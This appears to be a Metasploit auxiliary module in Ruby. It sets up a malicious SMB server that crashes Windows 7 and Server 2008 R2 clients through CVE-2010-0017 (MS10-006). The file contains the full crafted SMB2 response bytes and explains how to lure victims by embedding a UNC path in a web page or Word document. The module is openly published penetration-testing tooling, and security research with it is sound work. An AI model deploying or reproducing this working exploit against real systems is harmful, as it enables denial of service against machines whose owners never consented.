
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop',
      'Description'    => %q{
          This module exploits a denial of service flaw in the Microsoft
        Windows SMB client on Windows 7 and Windows Server 2008 R2. To trigger
        this bug, run this module as a service and forces a vulnerabile client
        to access the IP of this system as an SMB server. This can be accomplished
        by embedding a UNC path (\\HOST\share\something) into a web page if the
        target is using Internet Explorer, or a Word document otherwise.
      },
      'References'     =>
        [
          ['CVE', '2010-0017'],
          ['OSVDB', '62244'],
          ['MSB', 'MS10-006'],
          ['URL', 'http://g-laurent.blogspot.com/2009/11/windows-7-server-2008r2-remote-kernel.html']
        ],
      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'hdm' ],
      'License'        => MSF_LICENSE
    ))

    register_options([
      OptPort.new('SRVPORT', [ true, "The SMB port to listen on", 445 ])
    ], self.class)
  end

  def run
    print_status("Starting the malicious SMB service...")
    print_status("To trigger, the vulnerable client should try to access: \\\\#{Rex::Socket.source_address('1.2.3.4')}\\Shared\\Anything")
    exploit
  end

  def on_client_connect(client)
    client.get_once(-1, 1)
    req =   "\x00\x00\x00\x9a" + # 9e is the real length of the response
        "\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00" +
        "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        "\x41\x00\x01\x00\x02\x02\x00\x00\x30\x82\xa4\x11\xe3\x12\x23\x41" +
        "\xaa\x4b\xad\x99\xfd\x52\x31\x8d\x01\x00\x00\x00\x00\x00\x01\x00" +
        "\x00\x00\x01\x00\x00\x00\x01\x00\xcf\x73\x67\x74\x62\x60\xca\x01" +
        "\xcb\x51\xe0\x19\x62\x60\xca\x01\x80\x00\x1e\x00\x20\x4c\x4d\x20" +
        "\x60\x1c\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x12\x30\x10\xa0\x0e" +
        "\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
    client.put(req)
    client.get_once(-1, 1)
    client.close
  end
end
